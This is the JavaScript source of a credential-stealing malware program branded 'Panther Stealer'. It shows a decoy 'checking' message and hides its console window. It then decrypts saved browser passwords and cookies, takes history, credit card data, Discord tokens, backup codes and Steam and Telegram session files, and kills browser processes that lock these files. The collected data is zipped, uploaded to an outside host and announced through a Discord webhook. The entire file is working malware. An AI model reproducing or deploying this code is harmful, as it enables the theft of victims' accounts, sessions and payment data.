(async () => {
    console.clear()
    process.title = ''

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log('We are checking if everything is ok')

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const pa = require('path')
    const fs = require('fs-extra')
    const fa = require('fast-glob')
    const be = require('better-sqlite3')
    const wi = require('node-dpapi-prebuilt')
    const ci = require('crypto')
    const fu = require('find-process')
    const cm = require('child_process')
    const dw = require('discord-webhook-node')
    const fe = require('node-fetch')
    const ad = require('adm-zip')
    const sm = require('form-data')
    const ko = require('koffi')

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const ho = new dw.Webhook({
        'url': '*WEBHOOK*',
        'throwErrors': false,
        'retryOnLimit': true
    })

    ho.setUsername('Panther Stealer')
    ho.setAvatar('https://i.pinimg.com/564x/41/cf/30/41cf30478b0b1f936988aef69e404d7f.jpg')

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    async function sol(a, c) {
        return await new Promise(async (resolve) => {
            try {
                if (a.slice(0, 4).toString() === '0100') {
                    dec = wi.unprotectData(a, null, 'CurrentUser')

                    resolve(dec)
                } else {
                    dec = ci.createDecipheriv('aes-256-gcm', c, a.slice(3, 15)).setAuthTag(a.slice(-16))
                    dec = await dec.update(a.slice(15, -16), 'base64', 'utf-8') + dec.final('utf-8')

                    resolve(dec)
                }
            } catch (e) {
                resolve(false)
            }
        })
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fc = (await fu('name', 'exe')).map(o => o.bin)

    var dir_d = []
    var dir_v = []
    var dir_c = []
    var dir_s = []

    const co = {
        'pa': [],
        'pe': [],
        'pi': [],
        'po': [],
        'to': [],
        'pl': '❌',
        'be': [],
        'st': '❌',
        'tl': '❌'
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const us = ko.load('user32.dll')
    const ke = ko.load('kernel32.dll')

    const sh = us.func('int ShowWindow(void* hWnd, int nCmdShow)')
    const ge = us.func('void* GetParent(void* hWnd)')
    const gt = ke.func('void* GetConsoleWindow()')

    async function win() {
        const a = gt()
        return ge(a) || a
    }

    const hw = await win()
    if (hw) {
        sh(hw, 0)
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    let ip

    try {
        ip = await (await fe("https://ipinfo.io/json")).text()
    } catch { }

    if (ip.includes('city')) {
        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Computer', 'ip.txt'), `─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${JSON.stringify(ip, null, 3)}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`)
        co.pl = '✅'
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const cs of [
        process.env.APPDATA,
        process.env.LOCALAPPDATA,
        process.env['ProgramFiles(x86)'],
        process.env.USERPROFILE, '\\Downloads',
    ]) {
        const mm = await fa([
            '**/User Data/**/Login Data', '**/User Data/**/Cookies',
            '**/User Data/**/History', '**/User Data/**/Web Data',
            '**/Local Storage/leveldb/*.ldb', '**/Local Storage/leveldb/*.log',
            '**/*discord_backup_codes*', '**/*Backup-codes*',
            'config/**'
        ], {
            'dot': true,
            'cwd': cs,
            'absolute': true,
            'suppressErrors': true
        })

        if (cs.includes('AppData')) {
            dir_d.push(...mm.filter(o => /(Login Data|History|Cookies|Web Data)/.test(o)))
            dir_v.push(...mm.filter(o => o.includes('leveldb')))
        } if (cs.includes('Steam')) {
            dir_s.push(...mm.filter(o => o.includes('Steam/config')))
        } else {
            dir_c.push(...mm.filter(o => o.includes('codes')))
        }
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    for (let i = 0; i < dir_d.length; i++) {
        const di = dir_d[i]

        let ro = ''
        var fi = ''

        var ni = di.split('/')[6]
        let ka = ''

        const lo = di.includes('Cookies') ? {
            'na': 'SELECT * FROM Cookies',
            'ne': 'Cookie'
        } : di.includes('Login Data') ? {
            'na': 'SELECT * FROM Logins',
            'ne': 'Password'
        } : di.includes('History') ? {
            'na': 'SELECT * FROM urls',
            'ne': 'History'
        } : di.includes('Web Data') ? {
            'na': 'SELECT * FROM credit_cards',
            'ne': 'Credit Card'
        } : undefined

        if (!lo) {
            continue
        }

        const no = di.split('Profile ')[1]?.split('/')[0] ? `Profile ${di.split('Profile ')[1].split('/')[0]}-` : di.includes('Default') ? 'Default-' : di.includes('Guest') ? 'Guest-' : ''

        try {
            ro = new be(di, {
                'readonly': true
            }).prepare(lo['na']).all()
        } catch (e) {
            if (String(e).includes('database is locked')) {
                var ku = fc.find(o => o.includes(ni))

                if (ku) {
                    await new Promise(async (resolve) => {
                        cm.exec(`taskkill /F /IM ${pa.basename(ku)}`, (e, s, c) => {
                            if (e || s) {
                                resolve(false)
                            } else {
                                i--
                                resolve(true)
                            }
                        })
                    })
                }

                continue
            } else {
                continue
            }
        }

        if (!ro.length) {
            continue
        }

        if (lo['ne'] === 'Password' || lo['ne'] === 'Cookie') {
            try {
                ka = (await fa('**/Local State', {
                    'dot': true,
                    'cwd': di.split('/').slice(0, 6).join('/'),
                    'absolute': true,
                    'suppressErrors': true
                }))?.[0] ?? undefined

                if (!ka) {
                    continue
                }

                ka = await fs.promises.readFile(ka)
                ka = Buffer.from(JSON.parse(ka).os_crypt.encrypted_key, 'base64').slice(5)
                ka = wi.unprotectData(ka, null, 'CurrentUser')
            } catch (e) {
                continue
            }
        }

        for await (const vo of ro) {
            if (lo['ne'] === 'Password') {
                var de = await sol(vo['password_value'], ka)

                fi += `🔗 Url: ${vo['origin_url']}\n🧑 User: ${vo['username_value']}\n🔑 Password: ${de}\n\n`
                co.pa.push(1)
            } else if (lo['ne'] === 'Cookie') {
                var de = await sol(vo['encrypted_value'], ka)

                fi += `${vo['host_key']}\tTRUE\t/\tFALSE\t${vo['expires_utc']}\t${vo['name']}\t${de}\n\n`
                co.pe.push(1)
            } else if (lo['ne'] === 'History') {
                fi += `${vo.url}\n\n`
                co.pi.push(1)
            } else if (lo['ne'] === 'Credit Card') {
                fi += `🧑 Name: ${vo['name_on_card']}\n💳 Number: ${vo['card_number_encrypted']}\n⌛ Expires: ${vo['expiration_month'] ? (vo['expiration_month'] < 10 ? `0${vo['expiration_month']}` : vo['expiration_month']) : '❌'}/${vo['expiration_year'] ? vo['expiration_year'] : '❌'}\n\n`
                co.po.push(1)
            } else {
                continue
            }
        }

        if (fi) {
            await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Browser', lo['ne'], `${ni}-${no}${Date.now()}.txt`), `─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\nDirectory: ${di}\n\n${fi}─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`)
        } else {
            continue
        }
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const lã of dir_v) {
        let li

        try {
            li = (await fs.promises.readFile(lã, 'utf-8')).split('\n')
        } catch (e) {
            continue
        }

        if (lã.includes('cord')) {
            ka = (await fa('**/Local State', {
                'dot': true,
                'cwd': lã.split('/').slice(0, 6).join('/'),
                'absolute': true,
                'suppressErrors': true
            }))?.[0] ?? undefined

            if (!ka) {
                continue
            }

            ka = await fs.promises.readFile(ka, 'utf-8')
            ka = Buffer.from(JSON.parse(ka).os_crypt.encrypted_key, 'base64').slice(5)
            ka = wi.unprotectData(ka, null, 'CurrentUser')

            for await (const pa of li) {
                var oc = pa.match(new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g))

                if (oc) {
                    oc.forEach(async o => {
                        o = await sol(Buffer.from(o.split('dQw4w9WgXcQ:')[1], 'base64'), ka)
                        co.to.push(o)
                    })
                }
            }
        } else {
            for await (const pa of li) {
                var oc = pa.match(new RegExp(/[\w-_]{24,26}\.[\w-_]{6}\.[\w-_]{25,110}|mfa\.[\w-]{84}|[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}|[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g))

                if (oc) {
                    oc.forEach(o => {
                        co.to.push(o)
                    })
                }
            }
        }
    }

    if (co.to.length > 0) {
        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Discord', 'Token.txt'), `─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${co.to.join('\n')}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`)
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    for await (const ks of dir_c) {
        const ka = await fs.promises.readFile(ks, 'utf-8')

        await fs.outputFile(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Backup', `${pa.basename(ks)}-${Date.now()}.txt`), `─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygang ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─\n\n${ka}\n\n─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱ t.me/lofygan ⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─`)
        co.be.push(1)
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if (dir_s.length > 0) {
        co.st = '✅'

        for await (const kc of dir_s) {
            try {
                await fs.copy(kc, pa.resolve(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Steam\\', kc.split('/Steam/')[1]))
            } catch { }
        }
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if (await fs.exists(pa.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'))) {
        co.tl = '✅'

        try {
            await fs.copy(pa.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'), pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, 'Telegram'))

            for await (const ma of ['emoji', 'user_data']) {
                await fs.remove(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`, ma))
            }
        } catch { }
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const mc = new ad()

    await Promise.all([
        mc.addLocalFolder(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}`)),
        mc.writeZip(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`))
    ])

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fom = new sm()
    fom.append('file', fs.createReadStream(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`)))

    const up = await (await fe('https://api-lofy.xyz/upload', {
        'method': 'POST',
        'body': fom,
        'headers': {
            ...fom.getHeaders()
        }
    })).json()

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    const embed = new dw.MessageBuilder()
        .setTitle('Panther Stealer')
        .setColor('#a83f95')
        .setAuthor(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg', 'https://github.com/PantherOwO')
        .addField('🗺️ **Ip**', `\`\`\`${co.pl}\`\`\``, true)
        .addField('💻 **Backup**', `\`\`\`${co.to.length}\`\`\``, true)
        .addField('🚉 **Steam**', `\`\`\`${co.st}\`\`\``, true)
        .addField('🧦 **Telegram**', `\`\`\`${co.tl}\`\`\``, true)
        .addField('🧩 **Discord Token(s)**', `\`\`\`${co.to.length}\`\`\``, true)
        .addField('🔑 **Password(s)**', `\`\`\`${co.pa.length}\`\`\``, false)
        .addField('🍪 **Cookie(s)**', `\`\`\`${co.pe.length}\`\`\``, true)
        .addField('📅 **History(s)**', `\`\`\`${co.pi.length}\`\`\``, true)
        .addField('💳 **Credit Card(s)**', `\`\`\`${co.po.length}\`\`\``, true)
        .addField('🆙 **Dowlond**', `[Click Here](https://api-lofy.xyz/download?key=${up.key})`, true)
        .setThumbnail('https://i.pinimg.com/564x/19/f8/2f/19f82f9bfe1f76ec8b8415097152f85a.jpg')
        .setTimestamp()
        .setFooter(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg')

    return await ho.send(embed)

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
})()